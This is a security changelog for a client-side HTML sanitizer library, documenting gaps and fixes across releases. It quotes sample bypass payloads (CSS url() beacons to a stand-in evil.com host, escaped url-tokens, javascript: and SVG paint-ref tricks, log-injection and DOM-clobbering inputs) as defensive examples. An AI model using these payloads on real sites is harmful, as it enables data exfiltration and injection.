# 0html Security Improvements — v1.1.x → v1.8.0

Real gaps in the client-side output-safety core, each grounded, implemented in
the library's own allowlist/fail-closed style, and covered by tests. No
behavioral magic: refusals stay visible (console warns + dropped pieces), and
everything remains headless-testable with the in-file DOM shim.

**Verification: 691 assertions across 23 suites, 0 failures.** Counted by running
every suite, not by adding up round notes — earlier revisions of this line
double-counted. Reproduce with `./build.sh --test`.

| suite | n | | suite | n |
| --- | --: | --- | --- | --: |
| `0bind-test` | 43 | | `0cspval-test` (L1 values) | 26 |
| `0html-test` | 63 | | `0handlers-test` | 42 |
| `0bind-tt-test` | 9 | | `0sri-test` | 27 |
| `0hardening-test` | 15 | | `0l5l8-test` | 27 |
| `0harden2-test` | 40 | | `0tt-test` | 24 |
| `0urlmode-test` | 33 | | `0pin-test` | 13 |
| `0idpolicy-test` | 27 | | `0browser-test` | 39 |
| `0svg-test` | 40 | | `0clobber-test` | 30 |
| `0advise-test` | 21 | | `0verify-test` | 13 |
| `0cssesc-test` | 40 | | `0sbom-test` | 16 |
| `0scan-test` | 8 | | `0layers-test` | 68 |
| `adversary.cjs` | 27 | | **total** | **691** |

Plus, every run: 8,000–10,000 spec-fuzz cases (G1–G7) with zero counterexamples,
a 600-case hostile-SVG loop, 2,000 hostile documents through the scanner
property fuzzer (P1–P9), 800 through the differential against `python3
html.parser`, and the three shipped `dist/` tools loaded in a real browser. All
seeded and deterministic. `build.sh` re-pins the lock, generates and verifies the
SBOM, and self-verifies.

> Rounds: **v1.2.0** (1–5), **v1.3.0** (6–8), **v1.3.1** (9), **v1.4.0** (10,
> SBOM), **v1.5.0** (11, same-origin URL), **v1.6.0** (12, id namespacing),
> **v1.7.0** (13, safe SVG), **v1.8.0** (14, `advise()` detect-and-ask +
> presets). The three planned policies are shipped; v1.8.0 makes them
> *discoverable* so a project can detect and ask rather than having to know.

---

## The five changes

### 1. Inline-`style` CSS-injection sanitizer  — `I5`  *(0bind.js)*  **strongest fix**

**Gap.** The core accepted arbitrary `style` *strings* from untrusted specs. In a
library whose premise is "the JSON author is hostile," that's inconsistent: an
inline style can carry active CSS.

- `url(//evil.com/beacon?leak=…)` — a background load is a **silent GET**, i.e. a
  data-exfil / tracking channel that needs no user interaction.
- `expression(…)`, `url(javascript:…)`, `-moz-binding:url(…)`, `behavior:url(…)`
  — **script execution** on legacy engines.
- `@import url(…)` — pulls remote CSS.
- `position:fixed;inset:0;…` — full-viewport **overlay / UI-redress**.

**Fix.** `sanitizeStyle()` at the `el()` chokepoint (so both the compiler and
direct `el()` callers are covered). Hard-bans the script/`@import`/binding
constructs (with CSS-comment de-obfuscation so `expr/**/ession(` can't split the
token), and requires every `url()` to pass `isCssUrlSafe()` — same-origin/relative
or a safe **raster** `data:image` only (never `data:svg`, which can script; never
an off-origin URL). A 4 KB length cap bounds CSS-based DoS/obfuscation. Overlay
redressing can't be judged by value and is documented as a residual.

**Residual (unchanged scope).** `position:fixed` overlays remain expressible; the
threat model already treats layout-level redressing as out of scope for a value
sanitizer.

### 2. Immutable tag allowlist + frozen API  — `J8`  *(0html.js)*

**Gap.** The README promised "the allowlist is not spec-configurable, so no
loaded JSON can widen it" — true for JSON, but the export handed out the **live
`Set`**. Any co-bundled or gadget code in the same page could run
`html0.ALLOWED_TAGS.add('script')` and quietly re-open the sink. In the
single-file-tool model (everything shares scope), an untrusted dependency is a
realistic actor for this — and it directly contradicts the stated invariant.

**Fix.** Expose **frozen snapshots** (a fresh `Object.freeze([...])` per read),
never the live `Set`; add `isAllowedTag()`; and `Object.freeze` both the `html0`
and `bind` API objects so methods can't be swapped either. The internal
`ALLOWED_TAGS` the compiler checks is now private and unreachable. Extends the
guarantee from "not spec-configurable" to "not runtime-configurable via the
public API."

> **API note:** `ALLOWED_TAGS` / `FORBIDDEN_KEYS` now return a frozen **array**
> snapshot instead of a `Set`. Use `isAllowedTag(tag)` for membership. (The only
> in-repo consumer, `0html-fuzz.cjs`, held a now-harmless unused reference.)

### 3. URL backslash-fold  — `I3e`  *(0bind.js)*  *(defense-in-depth, not XSS)*

**Gap.** Browsers treat `\` as `/` in a URL authority, so `/\evil.com` and
`\\evil.com` resolve to the protocol-relative `//evil.com`. The gate saw the
leading `/` and classified them as innocent **relative paths** — letting a
backslash disguise a cross-origin host.

**Fix.** Fold `\`→`/` **before** any URL check, in both `isSafeUrl()` and
`isCssUrlSafe()`. `href`/`src` behavior for legitimate URLs is unchanged
(protocol-relative still passes there, exactly as before — it's non-executable);
the concrete win is in CSS, where a backslash-obfuscated off-origin **beacon**
(`url(/\evil.com/x)`) is now correctly refused by change #1.

### 4. Single-attribute value length cap  — `I6`  *(0bind.js)*

**Gap.** `maxNodes` bounds *structure* but not a lone multi-megabyte attribute
value (memory amplification the node-count bound doesn't see).

**Fix.** Refuse any single attribute value over 512 KB at the `el()` chokepoint —
far above any legitimate attribute, so it never bites real use.

### 5. `pin` no longer drops the toolchain integrity pins  *(0html-cli.cjs)*

**Gap (pre-existing).** `cmdPin()` wrote a fresh lock **without** the `toolchain`
array, and `verify` guards those checks behind `if (lock.toolchain)`. Because
`build.sh` calls `pin` on every build, each build **silently removed** the
engine/registry integrity pins — quietly weakening the supply-chain guarantee the
project advertises.

**Fix.** `pin` now re-pins the toolchain (recomputing hashes; preferring the file
set already recorded in an existing lock, else the default `0html-layers.cjs` +
`layers.json`). Integrity is complete again on every build: bundle + toolchain +
external SRI.

---

## Round two — v1.3.0

Continued hardening after v1.2.0. A systematic audit of URL-attribute coverage
came back **clean** (every URL-bearing attribute across the tag allowlist already
hits the scheme gate, because gating is by attribute name, not tag) — so #8 locks
that result in as a regression guard rather than fixing a live hole. #6 and #7
are genuine DoS-envelope fixes; the SVG item is a latent-trap note.

### 6. `fromJSON` raw-input byte cap  — `J9`  *(0html.js)*

**Gap.** `fromJSON` parses untrusted input (its own docstring: "load UI from
disk/URL/LLM output") with **no size guard**. `maxDepth`, `maxNodes`, and the
value caps all run *after* `JSON.parse` has already materialized the string — so
a multi-megabyte or deeply-nested blob exhausts memory/stack first.

**Fix.** Cap the raw input **before** parse (default 5 MB, `opts.maxInputBytes`).
Measured in **bytes**, not chars, so a multi-byte payload can't undercount its
true size. Over-limit → `RangeError` (fail-closed, consistent with the other
bound violations).

### 7. Per-node attribute-count cap  — `J10`  *(0html.js)*

**Gap.** `maxNodes` bounds the tree's node *count* but not the attribute count on
a **single** node. One node with 10⁶ attributes drives 10⁶ `setAttribute` calls
+ reflows — amplification the node bound doesn't see. (The v1.2.0 value cap
bounds each value's *length*, not the *number* of them.)

**Fix.** Bound attributes **and** handlers per node (default 256,
`opts.maxAttrs`); extras are dropped with a warning. Dropping only removes
capability, never adds it, so truncation is safe. The default is generous enough
that no normal node is affected.

### 8. URL-attribute coverage guard  *(0harden2-test.cjs)*  *(regression lock, not a new runtime control)*

**Finding.** Audit confirmed the URL gate covers every exploitable URL attribute
on every allowlisted tag. To keep it that way, a matrix test now compiles a
`javascript:` / `data:text/html` / `vbscript:` payload into each known
(tag, url-attr) pair and asserts it's dropped — with a positive control (a benign
relative href survives) so the matrix can't pass by trivially dropping
everything. If a future allowlist change adds a tag with a new URL attribute, or
drops one from the gate, this test fails and the hole is caught in CI.

### SVG namespace — latent-trap note  *(0bind.js)*

**Finding (documentation, not code behavior).** Allowlisted `svg`/`path`/… names
are created with `createElement` (HTML namespace), so they become inert
`HTMLUnknownElement`s — they don't render as graphics. That's currently *safe*,
but it's a footgun: "fixing" rendering with `createElementNS` would inherit the
full SVG attack surface. Added a prominent caution at the creation site: the
current allowlist is only safe because it excludes `foreignObject`/`animate`/
`set`/`script`/`<image>` and pins `<use href>` to same-doc `#id`; namespaced
creation must not happen without SVG-specific gating.

---

## Round three — v1.3.1  *(framework-driven)*

Found by running 0html against an external "automated web-app security" framework
as a review lens — specifically its A09 (logging/alerting) guidance on log
injection. The audit turned up one real gap.

### 9. Log-injection guard  — `I7`  *(CWE-117; 0bind.js + 0html.js)*

**Gap.** Every one of 0html's own warnings interpolates attacker-controlled text
— a rejected URL, tag name, attribute name, style, or handler/generator name —
straight into `console.warn`. Those values can carry CR/LF + control characters.
When a tool ships console output to a SIEM/aggregator (common), an attacker forges
fake log lines. Demonstrated: a `href` value of
`javascript:x\n2026 [CRITICAL] auth.bypass user=admin` produced a **second**,
forged `[CRITICAL]` log line.

**Fix.** A single `logSafe()` chokepoint (exported from 0bind; used by 0html via
`_bind.logSafe`) neutralizes every interpolated untrusted value before it reaches
the log: control chars incl. CR/LF/tab → `·`, one line, length-capped. Applied to
all ~14 interpolating warnings across both modules. It's a **logging-hygiene**
control only — it never changes what is rendered or refused, and warnings are
still emitted (verified they aren't silenced).

**Severity.** Defense-in-depth, not XSS — impact depends on whether a deployment
pipes console output to a log backend (the framework's A09 scenario). Same class
as the v1.2.0 backslash fix: cheap, correct, closes a real if situational vector.

---

## Round four — v1.4.0  *(supply-chain interop, tooling only)*

Fulfills the framework's A03 ask ("scanners must generate and audit SBOM /
CycloneDX artifacts"). **No change to `0bind.js` / `0html.js` runtime behavior** —
this round is entirely in the CLI + build. The version bump to 1.4.0 is a
coordinated release marker, not a runtime change.

### 10. CycloneDX 1.6 SBOM  *(0html-cli.cjs + build.sh)*

**Why it's real, not box-ticking.** 0html has **zero external dependencies**, so a
conventional "list your third-party packages" SBOM would be empty. The value here
is the inverse: the SBOM makes the zero-dependency claim *machine-verifiable*
(the entire dependency graph is internal 0html components — no `pkg:npm/…` nodes)
and re-expresses the same integrity hashes as the lock in a standard,
tool-ingestible shape (Dependency-Track, grype, trivy, OSV-Scanner).

**What it does.**
- New `0html sbom` command → `dist/0html.cdx.json`, a valid CycloneDX 1.6 doc:
  primary component `0html`, sub-components `0bind` / `0html-compiler` / the
  shipped bundle / the pinned toolchain files, each with a **hex** SHA-256 (the
  CycloneDX requirement — distinct from the lock's base64), a purl, and an
  explicit dependency graph. A `0html:externalRuntimeDependencies = 0` property
  states the claim outright.
- `0html verify` now **re-hashes every SBOM component against its file** and fails
  (`SBOM STALE`) on any drift, and flags any external-ecosystem component. A stale
  SBOM is a supply-chain lie — this keeps it honest on every build. Verified both
  directions: matching SBOM passes; a tampered component hash trips exit 1.
- `build.sh` generates the SBOM right after `pin`, so the same run pins the
  bundle + toolchain, emits the SBOM, and verifies all three.
- No license is asserted — the package declares none, and inventing one would be
  worse than omitting it.

**Not claimed.** The SBOM is validated *structurally* and for hash-accuracy by
`0sbom-test.cjs` (16 assertions); it is not run through the official CycloneDX
JSON schema validator (that would need a network fetch / external dep, which the
zero-dep toolchain avoids). The shape follows the 1.6 spec fields.

---

## Round five — v1.5.0  *(plan item 1 of 3: same-origin URL mode)*

First item from `PLAN-svg-urlmode-idpolicy.md`, shipped opt-in as planned.

### 11. Same-origin URL mode  — `I8` / `J11`  *(0bind.js + 0html.js)*

**Framework mapping:** A01 (off-origin fetch / SSRF-adjacent) + the exfil theme —
an untrusted spec emitting `<img src="https://evil/track">` or `<a href="//evil">`
is a silent beacon / navigation-exfil vector.

**What it does.** New opt-in `compile(spec, { urlPolicy: { mode:'same-origin',
base, allowedOrigins:[] } })`. In `same-origin` mode the compiler drops any
`href`/`src`/`srcset` (and other `URL_ATTRS`) that doesn't resolve to the base
origin or an explicitly allow-listed origin — refusing protocol-relative `//host`
and cross-origin absolute URLs — *before* `el()` sees them (`el()` still
scheme-checks what remains). Default `mode:'any'` is byte-for-byte the old
behavior, so nothing existing changes.

**Correctness (verified against Node `URL`, not asserted):** relative/fragment →
base origin (allow); `//evil` and cross-origin → refuse; `allowedOrigins` entry →
allow; `mailto:`/`tel:` → allow (no origin, not a silent load); userinfo
(`evil@app.example.com`) resolves to the *real* host (allow, correctly);
different port → different origin (refuse); punycode homographs → distinct origin
string (refuse); `srcset` → **every** candidate origin-checked, one bad candidate
drops the whole attribute. **Fails closed:** `same-origin` mode with no resolvable
base (SSR/test without one, and no `location`) refuses all URL attributes.

**Deployment (why it's opt-in):**
- Internal / untrusted-spec tools with no external assets → `same-origin, []`
  (hardest exfil posture).
- CDN users → `same-origin` + `allowedOrigins: ['https://cdn…']`.
- Public tools needing arbitrary external images → keep `any`, rely on CSP.
- SSR / non-browser → pass `base` explicitly.

Pairs with CSP: the mode prevents the URL from being *emitted*; CSP
`img-src`/`connect-src` is the network-layer enforcement backstop. Note CSS
`url()` was already same-origin/fragment-only (`isCssUrlSafe`), so this item only
needed to cover the navigation/resource attributes.

**Test:** `0urlmode-test.cjs` (33 assertions) — the full allow/refuse matrix,
srcset per-candidate, non-URL attrs untouched, fail-closed base, `location`
fallback, and the `originAllowed`/`attrOriginAllowed` unit exports.

---

## Round six — v1.6.0  *(plan item 2 of 3: id/name namespacing)*

Second plan item, shipped opt-in.

### 12. id/name namespacing  — `J12`  *(0html.js)*

**Framework mapping:** A05 / A08 (integrity) — attacker-controlled `id`/`name` in a
spec can shadow host-page globals (`window.X`, `document.X`), defeat
`getElementById` assumptions, or clobber named form access (DOM clobbering).

**What it does.** New opt-in `compile(spec, { idPolicy: { mode:'namespace'|'strict',
prefix:'0h-' } })`. In `namespace` mode a **deterministic prefix transform** is
applied uniformly, in one pass, to **both** id-defining and id-*referencing*
attributes: `id`, and `for` / `list` / `form` / `headers` / `aria-labelledby` /
`aria-describedby` / `aria-controls` / `aria-owns` / `aria-flowto` /
`aria-details` / `aria-activedescendant` (space-separated lists → each token), and
`href` / `xlink:href` values of the form `#frag`. Because both sides get the same
transform, intra-spec wiring (label↔input, aria, fragment links, `<use>` sprites)
stays intact while any host global not under the prefix becomes unclobberable.
Default `mode:'off'` = unchanged.

**Deliberate scope decisions (documented, not accidental):**
- **`name` is NOT prefixed** in `namespace` mode — it is server-visible submitted
  data, and prefixing it would silently break form submission. `id` (the primary
  clobbering vector, and DOM-only) carries the mitigation.
- **`strict`** adds a refusal layer: any *raw* `id` **or** `name` on a high-value
  collision denylist (`constructor`/`__proto__`/`location`/`length`/`forms`/… ,
  plus empty / single-char / numeric-only) is dropped+warned outright. Safe `id`s
  are still prefixed; safe `name`s are kept unprefixed.

**Honest limitations (in-code + here):** protects host globals only if the app's
own globals don't live under the chosen prefix (document: don't prefix your
globals with `0h-`); does not protect clobbering *within* the rendered subtree;
assumes id references are spec-local (an external `#id` reference would be
prefixed and break — an escape hatch is deferred unless requested); and rendered
ids change, so external CSS/JS targeting them must use the prefixed form — which
is exactly why it's opt-in.

**Composes** with same-origin URL mode: a `href="#frag"` is kept by the origin
check (fragment = same-origin) *and* prefixed by the id policy → `#0h-frag`;
verified together.

**Test:** `0idpolicy-test.cjs` (27 assertions) — off/namespace/strict, id +
every reference type, multi-token lists, `name` form-safety, link integrity
(label↔input stays wired), custom prefix, strict refusals, and the same-origin
composition.

---

## Round seven — v1.7.0  *(plan item 3 of 3: safe SVG rendering)*

Final plan item, and the deepest surface — so it got the most red-teaming and is
shipped opt-in behind the most testing.

### 13. Safe SVG rendering  — `I9` / `J13`  *(0bind.js + 0html.js)*

**Framework mapping:** A05 Injection. SVG is a historically rich XSS surface —
SMIL animation (`<animate attributeName="href" to="javascript:…">`), `xlink`,
`<foreignObject>` (embeds HTML), in-SVG `<style>`/`<script>`, and external
paint/filter refs.

**Current state it replaces.** Previously the allowlisted SVG tags were built with
`createElement` (HTML namespace) → inert `HTMLUnknownElement`s that didn't render
(safe but a documented latent trap). This turns them into a real, gated feature.

**What it does.** New opt-in `compile(spec, { svg: true })`:
- **Namespace-correct creation.** Under the opt-in, the compiler marks SVG-subset
  elements and 0bind builds them with `createElementNS(SVG_NS, …)`. Keyed off the
  tag name — safe because the subset is unambiguous. The **HTML path in `el()` is
  completely untouched**; SVG goes through a dedicated `applySvgAttrs`.
- **Element allowlist:** `svg, g, defs, symbol, use, path, circle, ellipse, rect,
  line, polyline, polygon, text, tspan`. Deliberately **excluded** (they reopen
  the surface): `foreignObject`, `animate`/`set`/`animateTransform`, `script`,
  `style`-element, `image`, and SVG `<a>`.
- **Attribute allowlist** (geometry / presentation / text / a11y) — anything not
  on it is dropped+warned. `on*` refused (namespace-agnostic). Inline `style`
  still goes through `sanitizeStyle` (I5).
- **Paint-ref `url()` gate:** `fill`/`stroke`/`clip-path`/`mask`/`filter`/`marker`
  values must be same-origin/fragment (`url(#grad)` ok, `url(https://evil/…)` and
  `url(//host)` refused) — reusing `isCssUrlSafe`.
- **`<use>`** stays pinned to same-document `#id` fragments (no remote SVG doc);
  `xlink:href` is set via `setAttributeNS(XLINK_NS, …)`; `href`/`xlink:href` are
  scheme-checked.

**Default `svg:false` = unchanged:** the pre-existing SVG subset stays
allowed-but-inert; the newly-added tags (`ellipse`/`tspan`/`defs`/`symbol`) are
refused when off. So no existing deployment changes.

**Scope note.** Shipped the unambiguous SVG-only subset. `title`/`desc` (HTML
`<title>` namespace ambiguity) and gradient elements (`linearGradient`/`stop`,
extra attribute surface) are deliberately deferred — add on request.

**Composition** verified with the other two policies: an SVG `id` is prefixed by
`idPolicy`; a `<use href="#icon">` is prefixed to `#0h-icon` and kept by the
same-origin check.

**Test:** `0svg-test.cjs` (40 assertions) — namespaced rendering, attribute
allowlist, a heavy **adversarial** section (SMIL/`foreignObject`/`script`/`image`/
external-`use`/`xlink:href`-javascript/paint-url all refused; SVG `<a>` degrades
to a scheme-gated HTML anchor; no `<script>` element ever appears), composition,
and a **600-spec hostile-SVG fuzz loop** asserting zero dangerous
elements/attrs/URLs.

---

## Round eight — v1.8.0  *(detect-and-ask: make the opt-in policies discoverable)*

The three policies are opt-in — but a project shouldn't have to *know* to turn
them on. This round adds detection so a project applying 0html can inspect a spec,
surface which policies apply, and ask the user — then apply the answer in one line.

### 14. `advise()` + presets + CI wrapper  *(0html.js + 0html-advise.cjs)*

**`html0.advise(spec, opts)`** — pure analysis (no DOM, never throws, bounded like
compile). Walks a spec and returns
`{ findings:[{policy,severity,detail,suggestion}], recommended, externalOrigins,
svgTags, scanned }`, detecting:
- **off-origin URLs** in `href`/`src`/`srcset` (protocol-relative + cross-origin),
  reporting the distinct external origins → recommends `urlPolicy:{mode:'same-origin'}`;
- **clobber-risk `id`/`name`** values (global-ish names) → recommends
  `idPolicy:{mode:'strict'}` (high), or a mild `namespace` suggestion when only
  benign ids are present;
- **inert SVG** (SVG tags present while `svg:false`) → recommends `svg:true`.

`recommended` is an opts fragment ready to spread into `compile()`. Crucially it
recommends the **safe default** — it does *not* auto-allow the external origins it
saw (that would defeat the purpose); those are reported separately in
`externalOrigins` for the human/ask step to selectively allow-list.

**Presets** — `compile(spec, { preset: 'strict' })` supplies policy defaults
(`strict` = same-origin URLs + strict ids; `namespace` = id namespacing); explicit
opts always override. So the detect→ask→apply loop closes in one switch.

**`0html-advise.cjs`** — a CLI/CI wrapper (loads the built bundle, needs no DOM):
`node 0html-advise.cjs spec.json` prints a human report + a ready-to-apply opts
fragment; `--json` for machine output; `--fail-on high|medium|low` exits non-zero
so CI can **gate** on risky specs. Verified: high-severity id → exit 2; clean spec
→ exit 0.

This is an **advisory** layer, not an enforcement change: `advise()` renders
nothing and changes no defaults. The policies stay opt-in; `advise()` just makes
them impossible to miss.

**Test:** `0advise-test.cjs` (21 assertions) — clean-spec silence, off-origin /
clobber / SVG detection, srcset candidates, recommendation applicability (spread
into compile and it enforces), active-policy suppression, preset expansion +
override, and bounded/no-throw on degenerate input.

---

## Round nine — v1.8.1  *(external review: two broken dist artifacts + four gate gaps)*

Found by an independent review of the v1.8.0 package. Two of these are the
uncomfortable kind — the runtime controls were fine, but **the artifacts that
ship them didn't execute**, and `verify` said everything was OK. The rest are
holes in gates that v1.2.0–v1.8.0 introduced.

### 15. `build.sh` inlining corrupted every single-file tool  *(build.sh)*  **most serious**

**Gap.** The inliner passed module source through `awk -v bundle="$bundle"`.
awk processes escape sequences in a `-v` assignment, so `\\` collapses to `\`.
The I3e backslash fold —

```js
.replace(/\\/g, '/')      // 0bind.js
.replace(/\/g, '/')       // what shipped in dist/
```

— became an unterminated regex that swallowed the rest of the line.
`dist/0html-starter.html`, `dist/0scan.html` and `dist/0html-playground.html`
all failed to parse: `SyntaxError: missing ) after argument list`. Not a
weakened control — **`html0` was never defined at all**. Every shipped tool had
been dead since v1.2.0, which is the release that introduced the first
top-level `\\` literal.

**Why nothing caught it.** `verify` checks that the CSP hash matches the inline
script and that the module files match the lock and SBOM. A corrupted inline
copy hashes perfectly self-consistently against itself. Nothing in the pipeline
ever *parsed* the artifact it shipped, and every test suite imports the source
modules, never `dist/`.

**Fix.** Inline by reading the file (`while ((getline l < f) > 0) print l`),
which is verbatim, at both injection sites. Plus `check_inline()`, a build-time
guard that extracts every inline module script **the way the HTML tokenizer
would** and syntax-checks it; the build now fails hard on a corrupt artifact.
Verified: the inlined script is byte-identical to `dist/0html.bundle.js`.

### 16. `</script>` inside a JS string truncated two tools  *(0scan / playground templates)*

**Gap.** Independent of #15, and the same two files. `0scan.template.html` and
`0html-playground.template.html` embed hostile *test inputs* containing a literal
`</script>` — inside the very block the bundle is inlined into. The HTML
tokenizer ends a script element at the first `</script`, JS string context be
damned, so the browser truncated the whole module at that point and parsed the
rest of the library as text.

**Fix.** Write them as `<\/script>` — an identical JS string value, invisible to
the tokenizer. The hostile-input fixtures are byte-for-byte unchanged at
runtime. `check_inline()` (#15) is the regression lock: it models browser
termination, so either bug now fails the build.

### 17. CSS escapes bypassed the `url()` gate  — `I5a`/`I5b`  *(0bind.js)*

**Gap.** `isCssUrlSafe` inherited the I3e fold `\` → `/`. That is right for URL
*attributes* (browsers treat `\` as `/` in an authority) and **inverted** inside
CSS, where `\` introduces an escape. The fold turned the escape marker into a
leading slash, so the value classified as an innocent rooted path:

```
url(\2f\2f evil.example/beacon)   → CSS unescapes to //evil.example/beacon
\75 rl(//evil.example/beacon)     → \75 rl( tokenizes as url( — gate never ran
```

Both are exactly the silent-GET exfil channel change #1 exists to close, and
both also reached the SVG paint-ref gate (`fill="url(\2f\2f …)"`). The comment
strip (`expr/**/ession(`) was the right instinct; escapes are the same class of
dodge and were not covered. Neither the fuzz corpus nor `adversary.cjs`
contained a single CSS escape, which is why 10,000 specs found nothing.

**Fix.** `isCssUrlSafe` refuses any backslash outright (no legitimate
same-origin URL or base64 `data:image` needs one — fail closed) instead of
folding. `sanitizeStyle` additionally scans **three de-obfuscated views** of the
value (de-commented, de-commented + unescaped, unescaped + de-commented), since
comments and escapes nest either way round; a hit in any view refuses. The
returned string is still the untouched original.

### 18. `preset` silently downgraded itself  — `J14`  *(0html.js)*

**Gap.** `applyPreset` was `Object.assign({}, base, opts)` — a whole-object
replace. So the workflow v1.8.0 exists to enable, after `advise()` reports
`externalOrigins` for selective allow-listing:

```js
compile(spec, { preset:'strict', urlPolicy:{ allowedOrigins:['https://cdn…'] } })
// mode:'same-origin' discarded → falls back to 'any' → off-origin src renders
```

Same for `{ preset:'strict', idPolicy:{ prefix:'app-' } }` → mode `off`, a
clobbering `id` kept and unprefixed. No warning either way. A preset that
disarms when you customise one field is worse than no preset.

**Fix.** One-level merge for the known policy objects, so a partial override
supplies fields without dropping the preset's `mode`. An explicit `mode` still
wins (verified: `idPolicy:{mode:'off'}` against `preset:'strict'` still turns it
off).

### 19. `advise()` was blind to the `id` shorthand  — `J15`  *(0html.js)*

**Gap.** `build()` honours a top-level `node.id`, but `advise()` only walked
`node.attrs` — so `{ tag:'div', id:'location' }` rendered a clobbering id with a
clean advisory. Directly against this round's premise ("impossible to miss").

**Fix.** `visit()` reads the shorthand too, feeding the same `isDangerousId`
check and `idCount`.

### 20. Two smaller consistency gaps  — `I6b`/`J8b`  *(0bind.js)*

- **`className` bypassed the I6 value cap.** The alias branch returned before the
  length check — the one attribute that could carry an unbounded value through
  `el()`. Only reachable via direct `el()` calls (the compiler normalises to
  `class`), but the cap should be at the chokepoint, not next to it.
- **The frozen API handed out the live handler registry.** `Object.freeze` on
  the api object is shallow, so `bind._registry.set('save', evil)` swapped any
  delegated handler — the same co-bundled-gadget actor and the same class of
  hole J8 closed for `ALLOWED_TAGS`, on a higher-value target. Now a fresh copy
  per read, matching the `ALLOWED_TAGS` snapshot pattern. (Freezing the `Map`
  would not have helped: `Object.freeze` does not disable `.set()`.)

**Test:** `0cssesc-test.cjs` (30 assertions) — escaped URL characters, escaped
url-tokens, positive controls that must survive (`content:"\201C"`,
`url(data:image/png;…)`, `url(#frag)`), SVG paint refs, preset merge in both
directions, the `advise()` shorthand, and the `className` cap.

**Reviewed and left alone (not gaps):** `srcset` comma-splitting fails safe in
every direction tested; the `idPolicy` strict denylist can be evaded with
padding (`" location"`) but a padded value clobbers nothing; `el()` still has no
tag allowlist, which is the documented layering — though the phrase "the `el()`
chokepoint" in this document is true for *values*, not tags.

### 21. Delegated dispatch trusted clobbered DOM  — `I10`  *(0bind.js + 0html.js)*

**Gap.** `dispatch()` walks from `e.target` up to the root, calling
`node.hasAttribute`, `node.getAttribute`, `node.dataset`, `node.parentNode` and
`node.nodeType` — **on nodes an untrusted spec built**. `HTMLFormElement` is
`[LegacyOverrideBuiltIns]`, so a named child shadows built-ins on the whole
prototype chain:

```json
{ "tag":"form", "attrs":{"action":"/save"},
  "children":[ { "tag":"input", "attrs":{"name":"hasAttribute"} } ] }
```

`form.hasAttribute` is then the `<input>`, not the method. Consequences, all
verified:

| clobbered `name` | effect |
| --- | --- |
| `hasAttribute` / `getAttribute` | `TypeError` **outside** the handler try/catch → on `submit`, `preventDefault()` never runs and the browser performs the **real form submission** |
| `parentNode` | the upward walk cycles — unbounded, tab-freezing |
| `nodeType` | walk stops early, binding **silently dropped** |

`name` is deliberately never prefixed by `idPolicy` (it is server-visible
submitted data), so the compiler cannot fix this; and `THREAT-MODEL.md` §
claimed "dispatch wraps handlers in try/catch; one bad handler warns, doesn't
crash" — true of the handler, not of the DOM access that precedes it.

**Fix.** The walk stops trusting the node: `_protoDesc()` resolves each accessor
off the **prototype chain**, where a named own property cannot shadow it, and
the walk is bounded at 512 hops so a cyclic `parentNode` terminates. `ctx.arg`
now comes from `getAttribute('data-arg')` rather than the clobberable `dataset`.
As defense in depth for host apps that walk the rendered tree themselves,
`idPolicy:'strict'` also refuses these names outright (`hasAttribute`,
`parentNode`, `nodeType`, `attributes`, `elements`, `submit`, `action`, …).

**Test:** `0clobber-test.cjs` (30 assertions) — every clobbered accessor, the
cyclic-walk bound, `ctx.arg` integrity, positive controls that normal
delegation still works, and the strict-mode refusals. The shim models the
browser faithfully on the one point that matters: `nodeType`/`parentNode` are
prototype **getters** and `hasAttribute`/`getAttribute` prototype **methods**,
with clobbering applied as own properties. A shim that put them on the instance
could not tell the fix from the bug. 16 of the 30 fail against v1.8.0.

### 22. `verify <file>` did not attest the file  *(0html-cli.cjs)*

**Gap.** This is the structural reason #15 shipped for six releases. Everything
`verify` checks — bundle hash, versions, toolchain, SBOM components — runs
against files sitting **next to the CLI**, not inside the tool being verified.
The one check that does read the tool, the CSP hash, is computed *from the
tool's own inline script*, so it is self-consistent by construction. Nothing
tied the two together.

Demonstrated: take `dist/0html-starter.html`, delete the entire library from the
inline script, drop in `window.html0 = { compile: s => s }` (no sanitization at
all), recompute the CSP hash — `0html verify` prints **"verify passed"**.

Secondary: `lastModuleScript()` hashed only the **last** inline module script,
so a second one shipped unhashed and would be blocked under enforce-mode CSP
while `verify` stayed green.

**Fix.** `verify <file>` now asserts the tool **carries the pinned library
verbatim** — `0bind.js` and the header-stripped `0html.js` must appear inside an
inline module script — and reports `TOOL DRIFT` otherwise. Both build paths
(`__BUNDLE__` and `__BIND__`/`__HTML__`) satisfy this, and the modules
themselves are hash-checked against the SBOM in the same run, so the chain
closes. Every inline module script is now hashed, and each hash must be present
in the document.

**Test:** `0verify-test.cjs` (13 assertions) — drives the real CLI: gutted
library and single-byte library edits both fail with `TOOL DRIFT`, an edit
outside the script still passes, an unhashed second script fails and is named,
two correctly-hashed scripts pass, and a stale hash is still caught.

### 23. The SVG paint path had its own, weaker CSS scanner  — `I5c`  *(0bind.js)*

**Found by the extended fuzzer (#24), not by hand — and it is a hole in the
v1.8.1 fix for #17, not in v1.8.0.** Hardening #17 rewrote `sanitizeStyle` to
scan de-obfuscated views of the value. `svgPaintSafe`, which gates
`fill`/`stroke`/`clip-path`/`mask`/`filter`/`marker`, was never routed through
it: it kept a private scanner that opened with

```js
if (!/url\(/i.test(v)) return true;      // no literal "url(" → declared safe
```

An escaped url-token is invisible to that test, so `fill="\75 rl(//evil/x)"`
and `filter="UR\4C (//evil/x)"` returned "safe" without any gating, and no
hard-ban check ran on the paint path at all (`expr\65 ssion(` survived too).
Two independent scanners for the same job, only one of them hardened.

**Fix.** `cssViews` / `cssBanned` / `cssUrlsSafe` are now factored out and
**shared** by both entry points, and the early return is gone — a paint value
is scanned whether or not it appears to contain a `url(`. Practical impact of
the url() case is bounded (Chrome and Safari do not fetch external paint
servers; external `filter` refs have wider history), but the gate exists
precisely to refuse it.

### 24. What the fuzzer was actually covering  *(0html-fuzz.cjs)*

The headline "8,000–10,000 fuzz specs per run with zero counterexamples" was
true and measured far less than it reads. Instrumenting the generator over
10,000 specs:

| construct | occurrences in 10,000 specs |
| --- | --- |
| `style` attribute set | 1,256 |
| …of those, containing `url(` | **0** |
| CSS escape sequences | **0** |
| `name` attribute emitted | **0** |
| protocol-relative URL | **0** |
| backslash anywhere in a value | **0** |
| value over 1 KB | **0** |

So I5 — "the strongest fix", the CSS `url()` gate — was exercised ~1,250 times
per run with values that never contained the construct it gates. The I3e
backslash fold, the I6 length cap, and every DOM-clobbering shape were
unreachable. Worse, the run loop only ever varied `allowTrustedHTML` and
`trustedGenerators`: **`urlPolicy`, `idPolicy`, `svg` and `preset` were never
set**, so every policy shipped from v1.5.0 onward had *zero* fuzz coverage and
the SVG namespace path was never constructed — the shim did not even define
